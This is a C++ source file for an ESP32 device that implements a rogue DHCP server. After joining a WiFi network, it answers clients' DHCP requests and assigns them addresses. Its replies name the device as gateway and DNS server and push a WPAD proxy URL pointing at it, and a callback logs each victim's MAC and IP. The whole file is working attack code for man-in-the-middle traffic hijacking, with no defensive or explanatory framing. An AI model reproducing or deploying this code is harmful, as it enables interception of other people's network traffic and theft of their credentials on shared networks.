#include "utils/network/RogueDhcpServer.h"
#include <esp_netif.h>
#include <WiFi.h>

// ── Public ──────────────────────────────────────────────────────────────────

bool RogueDhcpServer::begin()
{
  if (WiFi.status() != WL_CONNECTED) return false;

  _localIP = WiFi.localIP();
  _subnet  = WiFi.subnetMask();

  // Stop built-in DHCP if AP is also running
  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (apNetif) esp_netif_dhcps_stop(apNetif);

  if (!_udp.begin(67)) {
    if (apNetif) esp_netif_dhcps_start(apNetif);
    return false;
  }

  memset(_poolUsed, 0, sizeof(_poolUsed));
  memset(_clients, 0, sizeof(_clients));
  _clientCount = 0;
  _running = true;
  return true;
}

void RogueDhcpServer::stop()
{
  if (!_running) return;
  _running = false;
  _udp.stop();

  esp_netif_t* apNetif = esp_netif_get_handle_from_ifkey("WIFI_AP_DEF");
  if (apNetif) esp_netif_dhcps_start(apNetif);
}

void RogueDhcpServer::update()
{
  if (!_running) return;

  // Process multiple packets per frame for faster response
  for (int i = 0; i < 5; i++) {
    int len = _udp.parsePacket();
    if (len <= 0) return;
    if (len > 1024) { _udp.flush(); continue; }

    uint8_t buf[1024];
    _udp.read(buf, len);
    _handlePacket(buf, len);
  }
}

// ── Packet handling ─────────────────────────────────────────────────────────

void RogueDhcpServer::_handlePacket(uint8_t* buf, int len)
{
  uint8_t msgType = _getMsgType(buf, len);
  uint8_t mac[6];
  memcpy(mac, &buf[28], 6);

  uint8_t ipSuffix = 0;

  if (msgType == 1) { // DISCOVER → OFFER
    ipSuffix = _allocateIP(mac);
    if (ipSuffix == 0) return;
    _buildResponse(buf, len, 2, ipSuffix);
  } else if (msgType == 3) { // REQUEST → ACK
    ipSuffix = _allocateIP(mac);
    if (ipSuffix == 0) return;
    _buildResponse(buf, len, 5, ipSuffix);

    if (_clientCb) {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
      char ipStr[16];
      snprintf(ipStr, sizeof(ipStr), "%d.%d.%d.%d",
               _localIP[0], _localIP[1], _localIP[2], ipSuffix);
      _clientCb(macStr, ipStr);
    }
  } else {
    return;
  }

  _udp.beginPacket(IPAddress(255, 255, 255, 255), 68);
  _udp.write(buf, len);
  _udp.endPacket();
}

void RogueDhcpServer::_buildResponse(uint8_t* buf, int& len, uint8_t msgType, uint8_t ipSuffix)
{
  buf[0] = 2; // BOOTREPLY

  // yiaddr
  buf[16] = _localIP[0]; buf[17] = _localIP[1];
  buf[18] = _localIP[2]; buf[19] = ipSuffix;

  // siaddr
  buf[20] = _localIP[0]; buf[21] = _localIP[1];
  buf[22] = _localIP[2]; buf[23] = _localIP[3];

  // broadcast flag
  buf[10] = 0x80; buf[11] = 0x00;

  // clear sname tail
  memset(&buf[34], 0, 10);

  // magic cookie
  buf[236] = 0x63; buf[237] = 0x82;
  buf[238] = 0x53; buf[239] = 0x63;

  int i = 240;

  // Option 53: Message Type
  buf[i++] = 53; buf[i++] = 1; buf[i++] = msgType;

  // Option 54: Server Identifier (us)
  buf[i++] = 54; buf[i++] = 4;
  buf[i++] = _localIP[0]; buf[i++] = _localIP[1];
  buf[i++] = _localIP[2]; buf[i++] = _localIP[3];

  // Option 1: Subnet Mask
  buf[i++] = 1; buf[i++] = 4;
  buf[i++] = _subnet[0]; buf[i++] = _subnet[1];
  buf[i++] = _subnet[2]; buf[i++] = _subnet[3];

  // Option 3: Router (gateway = us)
  buf[i++] = 3; buf[i++] = 4;
  buf[i++] = _localIP[0]; buf[i++] = _localIP[1];
  buf[i++] = _localIP[2]; buf[i++] = _localIP[3];

  // Option 6: DNS Server (= us)
  buf[i++] = 6; buf[i++] = 4;
  buf[i++] = _localIP[0]; buf[i++] = _localIP[1];
  buf[i++] = _localIP[2]; buf[i++] = _localIP[3];

  // Option 51: Lease Time (1 day)
  buf[i++] = 51; buf[i++] = 4;
  buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x51; buf[i++] = 0x80;

  // Option 15: Domain Name
  static const char* domain = "local";
  buf[i++] = 15; buf[i++] = strlen(domain);
  memcpy(&buf[i], domain, strlen(domain)); i += strlen(domain);

  // Option 252: WPAD (proxy auto-config)
  char wpadUrl[64];
  snprintf(wpadUrl, sizeof(wpadUrl), "http://%s/wpad.dat", _localIP.toString().c_str());
  uint8_t wpadLen = strlen(wpadUrl);
  buf[i++] = 252; buf[i++] = wpadLen;
  memcpy(&buf[i], wpadUrl, wpadLen); i += wpadLen;

  // End
  buf[i++] = 255;

  while (i % 4 != 0) buf[i++] = 0;
  len = i;
}

uint8_t RogueDhcpServer::_getMsgType(uint8_t* buf, int len)
{
  if (len < 244) return 0;
  if (buf[236] != 0x63 || buf[237] != 0x82 || buf[238] != 0x53 || buf[239] != 0x63) return 0;

  int i = 240;
  while (i < len) {
    uint8_t opt = buf[i++];
    if (opt == 255) break;
    if (opt == 0) continue;
    if (i >= len) break;
    uint8_t optLen = buf[i++];
    if (i + optLen > len) break;
    if (opt == 53 && optLen == 1) return buf[i];
    i += optLen;
  }
  return 0;
}

uint8_t RogueDhcpServer::_allocateIP(uint8_t* mac)
{
  // Check existing
  for (int i = 0; i < POOL_SIZE; i++) {
    if (_clients[i].suffix != 0 && memcmp(_clients[i].mac, mac, 6) == 0) {
      return _clients[i].suffix;
    }
  }

  // Allocate new
  for (int i = 0; i < POOL_SIZE; i++) {
    if (!_poolUsed[i]) {
      _poolUsed[i] = true;
      memcpy(_clients[i].mac, mac, 6);
      _clients[i].suffix = _poolStart + i;
      _clientCount++;
      return _clients[i].suffix;
    }
  }
  return 0;
}
